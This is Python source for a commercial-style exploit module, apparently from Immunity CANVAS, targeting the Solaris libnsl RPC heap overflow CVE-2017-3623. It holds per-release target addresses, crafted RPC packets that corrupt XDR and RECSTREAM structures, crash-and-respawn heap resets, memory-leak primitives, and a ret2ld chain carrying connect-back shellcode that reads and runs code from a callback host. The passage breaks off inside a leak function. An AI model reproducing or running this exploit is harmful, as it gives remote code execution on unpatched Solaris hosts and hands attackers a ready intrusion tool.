#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  solaris_rpc_libnsl.py
## Description:
##            :
## Created_On :  Fri May 26 CEST 2017
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import sys
import os
import copy
import time
import socket
import select
import errno
import struct
import random
import logging

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'Solaris libnsl (RPC) - Remote Heap Overflow'
DESCRIPTION                     = 'Remote heap overflow within libnsl (aka EBBISLAND)'
VERSION                         = '0.2'

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Oracle'
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = 'Unlimited'
DOCUMENTATION["CVE Name"]       = "CVE-2017-3623"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3623"
DOCUMENTATION['CVSS']           = 10.0
DOCUMENTATION["References"]     = "http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html"

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY["ARCH"]                = [ ["Solaris"] ]
PROPERTY["VERSION"]             = [ "10" ]

CHANGELOG = """
    v0.1: Initial version targeting only bootparam
    v0.2: Adding support for other services and a fingerprinting function.
"""

NOTES = """
Confirmed working against:
    - Solaris 10 x86 u10 (x86/amd64)   [ bootparam, metamhd, metamedd, rusersd, metad]
    - Solaris 10 x86 u9  (x86)         [ bootparam, rusersd, metamedd ]
    - Solaris 10 x86 u8  (x86)         [ bootparam, rusersd ]
    - Solaris 10 x86 u7  (x86/amd64)   [ bootparam, rusersd (x86) ]
    - Solaris 10 x86 u6  (x86)         [ bootparam, rusersd ]
    - Solaris 10 x86 u4  (x86)         [ bootparam, rusersd ]
    - Solaris 10 x86 u3  (x86)         [ bootparam, rusersd ]
    - Solaris 10 x86 u2  (x86)         [ bootparam ]

Note:
    a) We only support Solaris 10 and the x86/amd64 architecture for now. Solaris 8/9
       would be trivial. On solaris x86 and amd64 userlands are the same when it comes 
       to rpc services as they are both running a 32 bits binary. However the address 
       space is slightly different but that is not a problem for us.
    b) Some targets are completely harcoded because one way or another it was not
       possible to leak (one cannot always respawn as much as wanted the target process).
    c) We do use leaks to minimize the amount of work (fingerprinting) as well as to 
       have a perfectly targetless way to exploit (bootparam only unfortunately).

To start / confirm the service is online:
as root:
svcadm enable -r svc:/network/rpc/bootparams
to confirm:
svcs | grep bootparam

If the service is online, it will be listed in the output. If no output
is shown that, the service is not running. Do not expect to find the
path by simply invoking the `svcs` command.

To get a node:
./commandlineInterface.py -v 12 -p 5555
./exploits/remote/unix/solaris_rpc_libnsl/solaris_rpc_libnsl.py -t 192.168.1.185 -l 192.168.1.186 -d 5555
"""

DEVNOTES = """
"""

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from shellcode import shellcodeGenerator
from solarisNode import solarisNode
import solarisMosdefShellServer

from libs import rpc
from libs.newsmb.Struct import Struct
from encoder import xorencoder

PROGNUM_BOOTPARAM = 100026
PROGNUM_METAD     = 100229

UNIVERSAL_GOT_ADDRESS = 0x08063000
MAX_TOP_STACK_ADDRESS = 0x08049000

DST_SRC_LEN_FUNC = 0
DST_SRC_FUNC     = 1
MEMCPY_FUNC      = DST_SRC_LEN_FUNC
STRNCPY_FUNC     = DST_SRC_LEN_FUNC
STRCPY_FUNC      = DST_SRC_FUNC

bootparam_x86_u10 = {
    'arch': 'x86',
    'writable_address': 0x080a0000,
    'copy_function': 0x080511d0,
    'copy_type': MEMCPY_FUNC,
    'mov_ebp_to_esp': 0x08052189,
    'shellcode_location': 0x080ac640,
    'saved_ebp': 0x8047d20,
}

bootparam_amd64_u10 = copy.copy(bootparam_x86_u10)
bootparam_amd64_u10['arch'] = 'amd64'

metamhd_x86_u10 = {
    'arch': 'x86',
    'writable_address': 0x8084000,
    'copy_function': 0x8052694,
    'copy_type': STRNCPY_FUNC,
    'mov_ebp_to_esp': 0x8057287,
    'shellcode_location': 0x8076300,
    'saved_ebp': 0x8047d4c,
}

metamhd_amd64_u10 = copy.copy(metamhd_x86_u10)
metamhd_amd64_u10['arch'] = 'amd64'

metamedd_x86_u9_u10 = {
    'arch': 'x86',
    'writable_address': 0x8068000,
    'copy_function': 0x8052438,
    'copy_type': STRCPY_FUNC,
    'mov_ebp_to_esp': 0x805542c,
    'shellcode_location': 0x80736a0,
    'saved_ebp': 0x8047d34,
}

metamedd_amd64_u9_u10 = copy.copy(metamedd_x86_u9_u10)
metamedd_amd64_u9_u10['arch'] = 'amd64'

rusersd_x86_u3 = {
    'arch': 'x86',
    'writable_address': 0x8063000,
    'copy_function': 0x8050e60,
    'copy_type': STRNCPY_FUNC,
    'mov_ebp_to_esp': 0x805120b,
    'shellcode_location': 0x806d530,
    'saved_ebp': 0x8047d44,
}

rusersd_amd64_u3 = copy.copy(rusersd_x86_u3)
rusersd_amd64_u3['arch'] = 'amd64'

rusersd_x86_u4 = {
    'arch': 'x86',
    'writable_address': 0x8063000,
    'copy_function': 0x8050e60,
    'copy_type': STRNCPY_FUNC,
    'mov_ebp_to_esp': 0x805120b,
    'shellcode_location': 0x806d588,
    'saved_ebp': 0x8047d44,
}

rusersd_amd64_u4 = copy.copy(rusersd_x86_u4)
rusersd_amd64_u4['arch'] = 'amd64'

rusersd_x86_u6 = {
    'arch': 'x86',
    'writable_address': 0x8063000,
    'copy_function': 0x8050e60,
    'copy_type': STRNCPY_FUNC,
    'mov_ebp_to_esp': 0x805120b,
    'shellcode_location': 0x806d650,
    'saved_ebp': 0x8047d44,
}

rusersd_amd64_u6 = copy.copy(rusersd_x86_u6)
rusersd_amd64_u6['arch'] = 'amd64'

rusersd_x86_u7 = {
    'arch': 'x86',
    'writable_address': 0x8063000,
    'copy_function': 0x8050e60,
    'copy_type': STRNCPY_FUNC,
    'mov_ebp_to_esp': 0x805120b,
    'shellcode_location': 0x806d650,
    'saved_ebp': 0x8047d44,
}

rusersd_amd64_u7 = copy.copy(rusersd_x86_u7)
rusersd_amd64_u7['arch'] = 'amd64'

rusersd_x86_u8 = {
    'arch': 'x86',
    'writable_address': 0x8063000,
    'copy_function': 0x8050e60,
    'copy_type': STRNCPY_FUNC,
    'mov_ebp_to_esp': 0x805120b,
    'shellcode_location': 0x806d650,
    'saved_ebp': 0x8047d44,
}

rusersd_amd64_u8 = copy.copy(rusersd_x86_u8)
rusersd_amd64_u8['arch'] = 'amd64'

rusersd_x86_u9_u10 = {
    'arch': 'x86',
    'writable_address': 0x8063000,
    'copy_function': 0x8050e60,
    'copy_type': STRNCPY_FUNC,
    'mov_ebp_to_esp': 0x805120b,
    'shellcode_location': 0x806d658,
    'saved_ebp': 0x8047d34,
}

rusersd_amd64_u9_u10 = copy.copy(rusersd_x86_u9_u10)
rusersd_amd64_u9_u10['arch'] = 'amd64'

metad_x86_u10 = {
    'arch': 'x86',
    'writable_address': 0x8070000,
    'copy_function': 0x805476c,
    'copy_type': STRCPY_FUNC,
    'mov_ebp_to_esp': 0x805bb7c,
    'shellcode_location': 0x8078b48,
    'saved_ebp': 0x8047d44,
}

metad_amd64_u10 = copy.copy(metad_x86_u10)
metad_amd64_u10['arch'] = 'amd64'

metamhd_endpoint = {
    'name': 'metamhd',
    'prognum': 100230,
    'version': 1,
    'proto': 'tcp',
    'targets' : { 'u10': [ metamhd_x86_u10, metamhd_amd64_u10 ] }
}

metamedd_endpoint = {
    'name': 'metamedd',
    'prognum': 100242,
    'version': 1,
    'proto': 'tcp',
    'targets' : { 'u9' : [ metamedd_x86_u9_u10, metamedd_amd64_u9_u10 ],
                  'u10': [ metamedd_x86_u9_u10, metamedd_amd64_u9_u10 ] }
}

rusersd_endpoint = {
    'name': 'rusersd',
    'prognum': 100002,
    'version': 2,
    'proto': 'tcp',
    'targets' : { 'u3' : [ rusersd_x86_u3, rusersd_amd64_u3],
                  'u4' : [ rusersd_x86_u4, rusersd_amd64_u4],
                  'u6' : [ rusersd_x86_u6, rusersd_amd64_u6],
                  'u7' : [ rusersd_x86_u7, rusersd_amd64_u7],
                  'u8' : [ rusersd_x86_u8, rusersd_amd64_u8],
                  'u9' : [ rusersd_x86_u9_u10, rusersd_amd64_u9_u10 ],
                  'u10': [ rusersd_x86_u9_u10, rusersd_amd64_u9_u10 ]}
}

metad_endpoint = {
    'name': 'metad',
    'prognum': PROGNUM_METAD,
    'version': 1,
    'proto': 'tcp',
    'targets' : { 'u10': [ metad_x86_u10, metad_amd64_u10 ] }
}

bootparam_endpoint = {
    'name'    : 'bootparam',
    'prognum' : PROGNUM_BOOTPARAM,
    'version' : 1,
    'proto'   : 'tcp',
    'targets' : { 'u10': [ bootparam_x86_u10, bootparam_amd64_u10 ] }
}

endpoints = []
endpoints.append(bootparam_endpoint)
endpoints.append(metad_endpoint)
endpoints.append(rusersd_endpoint)
endpoints.append(metamedd_endpoint)
endpoints.append(metamhd_endpoint)

bootparam_leak = {
    0x80ad718: [ 'u2' ],
    0x80addf0: [ 'u3' ],
    0x80ade80: [ 'u4' ],
    0x80ae058: [ 'u6' ],
    0x80ae078: [ 'u7', 'u8' ],
    0x80ae080: [ 'u9' ],
}

bootparam_leak_debug = {
    0x80adde0: [ 'u3' ],
    0x80ae050: [ 'u7', 'u8' ],
}

metad_leak = {
    0x0807b208: [ 'u3' ],
    0x0807b280: [ 'u4' ],
    0x0807b398: [ 'u6' ],
    0x0807c398: [ 'u7', 'u8' ],
    0x0807c3a0: [ 'u9', 'u10' ],
}

LEAK1_SLEEP_CRASH          = 10
LEAK1_SLEEP_NORMAL         = 1
LEAK2_SLEEP_CRASH          = 5
LEAK2_SLEEP_NORMAL         = 1

LEAK_SIZE                  = 2048
SECURITY_OFFSET            = 128
PAGE_SIZE                  = 4096

PKT_CRASH = 1
PKT_LEAKY = 2
PKT_MAGIC_1 = 3
PKT_MAGIC_2 = 3

class XDR(Struct):
    """
    typedef struct {
	enum xdr_op	x_op;		/* operation; fast additional param */
	struct xdr_ops {
		bool_t	(*x_getlong)();	/* get a long from underlying stream */
		bool_t	(*x_putlong)();	/* put a long to " */
		bool_t	(*x_getbytes)(); /* get some bytes from " */
		bool_t	(*x_putbytes)(); /* put some bytes to " */
		u_int	(*x_getpostn)(); /* returns bytes off from beginning */
		bool_t	(*x_setpostn)(); /* lets you reposition the stream */
		long *	(*x_inline)();	/* buf quick ptr to buffered data */
		void	(*x_destroy)();	/* free privates of this xdr_stream */
	} *x_ops;
	caddr_t 	x_public;	/* users' data */
	caddr_t		x_private;	/* pointer to private data */
	caddr_t 	x_base;		/* private used for position info */
	int		x_handy;	/* extra private word */
    } XDR;
    """

    st = [
        ['x_op'      , '<L', 0],
        ['x_ops'     , '<L', 0],
        ['x_public'  , '<L', 0],
        ['x_private' , '<L', 0],
        ['x_base'    , '<L', 0],
        ['x_handy'   , '<L', 0],
    ]

    def __init__(self, data=None, x_ops=0, x_private=0):
        Struct.__init__(self, data)

        if data is None:
            self['x_ops'] = x_ops
            self['x_private'] = x_private

    def pack(self):
        return Struct.pack(self)

class RECSTREAM(Struct):
    """
    typedef struct rec_strm {
	    caddr_t tcp_handle;
	    /*
	     * out-going bits
	     */
	    int (*writeit)();
	    caddr_t out_base;	/* output buffer (points to frag header) */
	    caddr_t out_finger;	/* next output position */
	    caddr_t out_boundry;	/* data cannot up to this address */
	    uint32_t *frag_header;	/* beginning of current fragment */
	    bool_t frag_sent;	/* true if buffer sent in middle of record */
	    /*
	     * in-coming bits
	     */
	    int (*readit)();
	    caddr_t in_base;	/* input buffer */
	    caddr_t in_finger;	/* location of next byte to be had */
	    caddr_t in_boundry;	/* can read up to this location */
	    int fbtbc;		/* fragment bytes to be consumed */
	    bool_t last_frag;
	    uint_t sendsize;
	    uint_t recvsize;
	    /*
	     * Is this the first time that the
	     * getbytes routine has been called ?
	     */
	    uint_t firsttime;
	    /*
	     * Is this non-blocked?
	     */
	    uint_t in_nonblock;	/* non-blocked input */
	    uint_t in_needpoll;	/* need to poll to get more data ? */
	    uint32_t in_maxrecsz;	/* maximum record size */
	    caddr_t in_nextrec;	/* start of next record */
	    uint32_t in_nextrecsz;	/* part of next record in buffer */
    } RECSTREAM;
    """

    st = [
        ['tcp_handle'  , '<L', 0],
        ['writeit'     , '<L', 0],
        ['out_base'    , '<L', 0],
        ['out_finger'  , '<L', 0],
        ['out_boundry' , '<L', 0],
        ['frag_header' , '<L', 0],
        ['frag_sent'   , '<L', 0],
        ['readit'      , '<L', 0],
        ['in_base'     , '<L', 0],
        ['in_finger'   , '<L', 0],
        ['in_boundry'  , '<L', 0],
        ['fbtbc'       , '<L', 0],
        ['last_frag'   , '<L', 0],
        ['sendsize'    , '<L', 0],
        ['recvsize'    , '<L', 0],
        ['firsttime'   , '<L', 0],
        ['in_nonblock' , '<L', 0],
        ['in_needpoll' , '<L', 0],
        ['in_maxrecsz' , '<L', 0],
        ['in_nextrec'  , '<L', 0],
        ['in_nextrecsz', '<L', 0],
    ]

    def __init__(self, data=None,
                       tcp_handle=0,
                       writeit=0,
                       out_finger=0,
                       out_boundry=0,
                       frag_header=0,
                       in_base=0,
                       in_finger=0,
                       in_boundry=0,
                       sendsize=0,
                       recvsize=0):
        Struct.__init__(self, data)

        if data is None:
            self['tcp_handle'] = tcp_handle
            self['writeit'] = writeit
            self['out_finger'] = out_finger
            self['out_boundry'] = out_boundry
            self['frag_header'] = frag_header
            self['readit'] = readit
            self['in_base'] = in_base
            self['in_finger'] = in_finger
            self['in_boundry'] = in_boundry
            self['sendsize'] = sendsize
            self['recvsize'] = recvsize

    def pack(self):
        return Struct.pack(self)

class Packet:

    def __init__(self, packet_type,
                       xid=0x1fc9772d,
                       program_number=100026,
                       where=0,
                       what=0):

        self.type = packet_type
        self.xid = xid
        self.program_number = program_number
        self.host = None
        self.where = where
        self.what = what
        self.gid_len = 20
        self.parameters = None
        self.parameters_length = 1024
        self.pattern1 = 0xeeeeeeee
        self.pattern2 = None
        self.pattern3 = None

        if packet_type not in [PKT_CRASH, PKT_LEAKY, PKT_MAGIC_1, PKT_MAGIC_2]:
            raise ValueError('Invalid parameter type')

        if (packet_type != PKT_CRASH) and self.gid_len > 30:
            raise ValueError('Invalid gid_len parameter for type requested.')


    def __build_credentials_hdr(self, data):
        creds  = struct.pack('>L', 0x55de)
        creds += struct.pack('>L', len(data))
        creds += data
        creds += struct.pack('>L', 0)
        creds += struct.pack('>L', 0)
        return creds

    def set_parameters(self, params):
        self.parameters = params

    def __build_parameters(self):
        s = ''
        for i in xrange(self.parameters_length / 4):
            s += struct.pack('>L', ((self.pattern2 << 16)| i))
        return s

    def build_host_with_fake_recstream(self, orig_obj, address, size=256):
        """
        Method used to create the fake RECSTREAM object.
        Kinda amator right now, will be improved later.
        """
        fake_obj = copy.deepcopy(orig_obj)
        if size == PAGE_SIZE*2:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + (PAGE_SIZE*2)     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + (PAGE_SIZE*2)+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + (PAGE_SIZE*2)+32
        elif size == PAGE_SIZE:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + PAGE_SIZE     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + PAGE_SIZE+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + PAGE_SIZE+32
        elif size == 2048:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + 2048     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + 2048+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + 2048+32
        elif size == 1024:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + 1024     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + 1024+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + 1024+32
        elif size == 512:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + 512     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + 512+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + 512+32
        elif size == 256:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + 256     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + 256+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + 256+32
        elif size == 128:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + 128     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + 128+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + 128+32
        elif size == 32:
            fake_obj['out_base']    = address
            fake_obj['out_finger']  = address + 32     # size(payload_returned) - 32
            fake_obj['out_boundry'] = address + 32+32  # acts as a modulo on the size
            fake_obj['frag_header'] = address + 32+32
        else:
            raise ValueError('BUG: build_host_with_fake_recstream() was called with an invalid size: %d' % size)
        s  = fake_obj.pack()
        s += 'X' * (252 - len(s))
        self.host = s

    def __build_opaque_data0(self):
        """
        This payload crashes the target binary.
        This is meant to reset the heap into its original step.

        Params: self.gid_len  (40 triggers a crash 100% of the time)
                self.pattern2 (the value used within the gid array)

        bash-3.00# gdb /usr/sbin/rpc.bootparamd core
        [...]
        Core was generated by `/usr/sbin/rpc.bootparamd -d'.
        Program terminated with signal SIGSEGV, Segmentation fault.
        #0  0xd132e2cc in xdr_replymsg () from /lib/libnsl.so.1
        (gdb) x/i $pc
        => 0xd132e2cc <xdr_replymsg+75>:        mov    0x18(%ecx),%ecx
        (gdb) print /x $ecx
        $1 = 0xdeadbeef
        """

        creds  = struct.pack('>L', 0x45464748)  # aup_time         [ off: +0  ]
        creds += struct.pack('>L', 252)         # str_len
        if self.host:
            creds += self.host
        else:
            creds += self.pattern3 * 252        # area_machname    [ off: +24 ]
                                                #(garbage is ok)

        creds += struct.pack('>L', 0)           # aup->aup_uid     [ off: +8  ]
        creds += struct.pack('>L', 0)           # aup->aup_gid     [ off: +12 ]
        creds += struct.pack('>L', self.gid_len)
        for i in xrange(self.gid_len):
            creds += struct.pack('>L', self.pattern1)
        return creds

    def __build_opaque_data1(self):
        """
        struct authsys_parms {
	        uint_t	 aup_time;
	        char	*aup_machname;
	        uid_t	 aup_uid;
	        gid_t	 aup_gid;
	        uint_t	 aup_len;
	        gid_t	*aup_gids;
        };

	    struct area {
		    struct authsys_parms area_aup;
		    char area_machname[MAX_MACHINE_NAME+1]; // 256 bytes
		    gid_t area_gids[NGRPS_LOOPBACK];        // filled with aup_len * sizeof(git_t)
	    } *area;
        """

        # This object is always at $edi - 428 when $corrupted_ecx is
        # dereferenced

        creds  = struct.pack('>L', self.xid)     # aup_time                [ off: +0  ]
        creds += struct.pack('>L', 9)            # str_len
        creds += (self.pattern3 * 9)             # area_machname           [ off: +24 ]
                                                 #(garbage is ok)
        creds += "\0" * 3                        # padding
        creds += struct.pack('>L', 0)            # aup->aup_uid            [ off: +8  ]
        creds += struct.pack('>L', 0)            # aup->aup_gid            [ off: +12 ]

        nbr_items = 31
        creds += struct.pack('>L', nbr_items)    # gid_len
        creds += (struct.pack('>L', 0xaabbccdd)*(nbr_items-21))

        '''
           DUMMY       +0   // size       // t_s
           DUMMY       +4
           tp          +8   // LINKBAK    // t_p
           DUMMY       +12
           0xffffffff  +16  // ISNOTREE() // t_l
           DUMMY       +20
           DUMMY       +24  //            // t_r
           DUMMY       +28
           sp = 0|x    +32  // LINKFOR()  // t_n
        '''

        pattern  = struct.pack('>L', 0)
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', 0)             # ????
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', 0)             # ????
        pattern += struct.pack('>L', 0)                        
        pattern += struct.pack('>L', 0x200)         # t_s  +0
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', self.where)    # t_p  +8
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', 0xffffffff)    # t_l  +16
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', 0)             # t_r  +24
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', self.what)     # t_n  +32   # Must be writable!
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', 0)             #
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', 0)
        pattern += struct.pack('>L', 0)

        creds += pattern
        creds += struct.pack('>L', 0xffffffc0|1)
        return creds

    def __build_opaque_data2(self):
        return self.__build_opaque_data0()

    def __build_opaque_data3(self):
        return self.__build_opaque_data1()

    def get(self):

        if self.type == PKT_CRASH:
            self.pattern2 = 0xdeaf
            self.pattern3 = "U"
            opaque_data = self.__build_opaque_data0()
        elif self.type == PKT_MAGIC_1:
            self.pattern2 = 0xABCD
            self.pattern3 = "V"
            opaque_data = self.__build_opaque_data1()
        elif self.type == PKT_LEAKY:
            self.pattern2 = 0xbeef
            self.pattern3 = "W"
            opaque_data = self.__build_opaque_data2()
        elif self.type == PKT_MAGIC_2:
            self.pattern2 = 0xABCD
            self.pattern3 = "V"
            opaque_data = self.__build_opaque_data3()

        hdr  = struct.pack('>L', self.xid)               # XID
        hdr += struct.pack('>L', 0)                      # Message Type
        hdr += struct.pack('>L', 2)                      # RPC Version
        hdr += struct.pack('>L', self.program_number)    # Program number
        hdr += struct.pack('>L', 0)                      # Program version
        hdr += struct.pack('>L', 0)                      # Procedure

        pkt  = hdr
        pkt += self.__build_credentials_hdr(opaque_data)
        if self.parameters:
            pkt += self.parameters
        else:
            pkt += self.__build_parameters()
        pkt  = struct.pack('>L', len(pkt) | 0x80000000) + pkt

        return pkt

###
# The main exploit class
##

class theexploit(tcpexploit):

    def __init__(self, getsock=None):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = '127.0.0.1'
        self.port               = 0
        self.needsNoShellcode   = False
        self.timeout            = 3
        self.getsock            = getsock
        self.endpoint           = None
        self.p_recstream        = None
        self.p_xdr              = None
        self.p_fake_recstream   = None
        self.orig_recstream_obj = None
        self.stack_address      = None
        self.stack_pages        = None
        self.original_xdr       = None
        self.ret2addr           = None
        self.ld_data_addr       = None
        self.leaked_offset      = None
        self.saved_ebp          = None
        self.debug              = False
        return

    def neededListenerTypes(self):
        return [canvasengine.SOLARISMOSDEF_INTEL]

    def get_args(self):
        self.parentnode = self.argsDict['passednodes'][0]
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.debug = bool(self.argsDict.get('debug', self.debug))
        return

    ###
    # Shellcode & ret2libc generators
    ###

    def get_payload(self, badstring=None):

        mosdef_type=self.engine.getMosdefType(canvasengine.SOLARISMOSDEF_INTEL)
        mosdef_id=self.engine.getNewMosdefID(self)

        sc = shellcodeGenerator.solaris_X86()
        sc.addAttr("connect", {"port":self.callback.port,
                               "ipaddress":self.callback.ip,
                               "syscallType": 2})
        sc.addAttr("read_and_exec", {"fdreg": 'esi',
                                     "syscallType": 2})

        rawshellcode = sc.get()

        if badstring:

            encoder=xorencoder.simpleXOR()
            encoder.setbadstring(badstring)
            ret=encoder.find_key(rawshellcode)
            if ret==0:
                logging.error('Could not find a key for this shellcode!')
                raise Exception,'No shellcode generated'

            return encoder.encode(rawshellcode)

    def build_ret2ld_payload(self):
        """
        Build the little piece of ret2ld code necessary to copy our shellcode
        on a rwx area (which is LD by default on Solaris xD
        """

        FAKE_EB1 = self.ret2addr+12
        FAKE_EB2 = 0xdeadbeef
        if self.target_parameters['copy_type'] == STRCPY_FUNC:
            SHELLCODE_ADDR=self.ret2addr+32
        else:
            SHELLCODE_ADDR=self.ret2addr+36
        shellcode = self.get_payload(badstring='\0')
        s  = struct.pack('<L', FAKE_EB1)                                  # POP EBP (fake frame #1)       # 0
        s += struct.pack('<L', self.target_parameters['mov_ebp_to_esp'])  # POP EIP => ESP = FAKE_EBP1    # 4
        s += struct.pack('<L', 0xbeefbeef)                                # CORRUPTED BY THE WRITE4       # 8
        s += struct.pack('<L', FAKE_EB2)                                  # POP EBP (fake frame #2)       # 12
        s += struct.pack('<L', self.target_parameters['copy_function'])   # POP EIP => MEMCPY             # 16
        s += struct.pack('<L', self.ld_data_addr)                         # RET TO SHELLCODE              # 20
        s += struct.pack('<L', self.ld_data_addr)                         # DST                           # 24
        s += struct.pack('<L', SHELLCODE_ADDR)                            # SRC                           # 28
        if self.target_parameters['copy_type'] != STRCPY_FUNC:
            s += struct.pack('<L', len(shellcode))                        # LEN                           # 32
        s += shellcode                                                    # SC                            # 36
        s += ('\0' * 4)
        s += '\xcc' * (1024-len(s))
        return s


    ####
    # Dump/debugging functions
    ####


    def display_xdr(self, xdr_obj):
        """
        Display an XDR object
        """
        logging.info("\txdrs.x_op = %d" % xdr_obj['x_op'])
        logging.info("\txdrs.x_ops = 0x%.8x" % xdr_obj['x_ops'])
        logging.info("\txdrs.x_public = 0x%.8x" % xdr_obj['x_public'])
        logging.info("\txdrs.x_private = 0x%.8x [RECSTREAM object]" % xdr_obj['x_private'])
        logging.info("\txdrs.x_base = 0x%.8x" % xdr_obj['x_base'])
        logging.info("\txdrs.x_handy = %d" % xdr_obj['x_handy'])

    def display_recstream(self, recstream_obj):
        """
        Display a RECSTREAM object
        """
        logging.info("\trecstream.tcp_handle = 0x%.8x" % recstream_obj['tcp_handle'])
        logging.info("\trecstream.writeit = 0x%.8x" % recstream_obj['writeit'])
        logging.info("\trecstream.out_base = 0x%.8x" % recstream_obj['out_base'])
        logging.info("\trecstream.out_finger = 0x%.8x" % recstream_obj['out_finger'])
        logging.info("\trecstream.out_boundry = 0x%.8x" % recstream_obj['out_boundry'])
        logging.info("\trecstream.frag_header = 0x%.8x" % recstream_obj['frag_header'])
        logging.info("\trecstream.frag_sent = %d" % recstream_obj['frag_sent'])
        logging.info("\trecstream.readit = 0x%.8x" % recstream_obj['readit'])
        logging.info("\trecstream.in_base = 0x%.8x" % recstream_obj['in_base'])
        logging.info("\trecstream.in_finger = 0x%.8x" % recstream_obj['in_finger'])
        logging.info("\trecstream.in_boundry = 0x%.8x" % recstream_obj['in_boundry'])
        logging.info("\trecstream.fbtbc = %d" % recstream_obj['fbtbc'])
        logging.info("\trecstream.last_frag = %d" % recstream_obj['last_frag'])
        logging.info("\trecstream.sendsize = %d [0x%.8x]" % (recstream_obj['sendsize'], recstream_obj['sendsize']))
        logging.info("\trecstream.recvsize = %d [0x%.8x]" % (recstream_obj['recvsize'], recstream_obj['recvsize']))
        logging.info("\trecstream.firsttime = %d" % recstream_obj['firsttime'])
        logging.info("\trecstream.in_nonblock = %d" % recstream_obj['in_nonblock'])
        logging.info("\trecstream.in_needpoll = %d" % recstream_obj['in_needpoll'])
        logging.info("\trecstream.in_maxrecsz = %d" % recstream_obj['in_maxrecsz'])
        logging.info("\trecstream.in_nextrec = 0x%.8x" % recstream_obj['in_nextrec'])
        logging.info("\trecstream.in_nextrecsz = %d" % recstream_obj['in_nextrecsz'])


    ###
    # Network primitives
    ###


    def port_map(self, prog=None, vers=None):
        """
        Gets the port used by the target process identified with prog/vers.
        These values will change once the process has crashed.
        """
        try:
            # mapping: program number, version, protocol, port
            pmap = rpc.TCPPortMapperClient(self.host, getsock = self.getsock)
            port = pmap.Getport((prog, vers, rpc.IPPROTO_TCP, 0))
            return port
        except:
            # The reason we do this is because TCPPortMapperClient seemingly
            # throws an exception that cannot be formated into a string.
            raise RuntimeError('Could not connect to port mapper, the port is either close or unreachable.')


    def reset_heap(self, max_nbr_attempts=5):
        """
        Mandatory primitive to reset/stabilize the heap.
        Thanks to that, we can always go back to perfectly known process state
        """

        # First get the port. We do not expect any problem at this point.
        # If it failed, that would trigger an exception caught by the calling
        # function anyway.
        self.port = self.port_map(prog=self.endpoint['prognum'], vers=self.endpoint['version'])
        logging.debug("reset_heap: current port is %d" % self.port)

        # We need that payload
        payload_crashy = Packet(PKT_MAGIC_1,
                                program_number=self.endpoint['prognum'],
                                where=0xaaaaaaaa,
                                what=0xbbbbbbbb).get()

        # Sending it at most 2 times on average is enough to trigger a crash.
        # Whenever the remote process crashes, it respawns using another port.
        for i in xrange(max_nbr_attempts):
            try:
                logging.debug("reset_heap: attempt %d/%d" % (i+1,max_nbr_attempts))
                fd = socket.socket()
                fd.connect((self.host, self.port))
                fd.send(payload_crashy)
                ret = fd.recv(512)
                fd.close()
                logging.debug("reset_heap: failure")
            except Exception as e:
                logging.debug("reset_heap: success [%s]" % str(e))
                self.nbr_crashes+=1
                logging.debug("Current number of crashes: %d" % self.nbr_crashes)
                for j in xrange(20):
                    time.sleep(0.2)
                    port = self.port_map(prog=self.endpoint['prognum'], vers=self.endpoint['version'])
                    if not port:
                        logging.debug("reset_heap: process has not respawned yet.")
                        continue
                    else:
                        self.port = port
                        logging.debug("reset_heap: new port is %d" % self.port)
                        return

    ###
    # Address space API.
    ###

    def is_stack_address(self, x):
        if x < (self.stack_address-PAGE_SIZE):
            return False
        if x >= (self.stack_address+PAGE_SIZE):
            return False
        return True

    def is_libnsl_address(self, x):
        """
        This function returns True if the address is part
        of the code/data segments of the libnsl binary
        Note: Quite empirical.
        """
        if x < (self.libnsl_address):
            return False
        if x >= (self.libnsl_address+0x90000):
            return False
        return True

    ####
    # Leak API
    ####

    def __leak_data1_b(self, address, amount=1024):
        """
        Leak primitive #1
        We have partial control over what we can leak both in terms of size and source.
        Fortunately we can use it to leak the heap as much as we can _before_ our buffer.
        We use this to locate a RECSTREAM to create a new leak primitive.
        """

        payload_leaky = Packet(PKT_LEAKY,
                               xid=0x4c45414b,
                               program_number=self.endpoint['prognum']).get()

        logging.debug("%s: where=0x%.8x, what=0x%.8x" % (sys._getframe().f_code.co_name,
                                                         self.p_recstream+8,
                                                         address))
        self.reset_heap(5)

        logging.debug("%s: target port is now %d" % (sys._getframe().f_code.co_name, self.port))
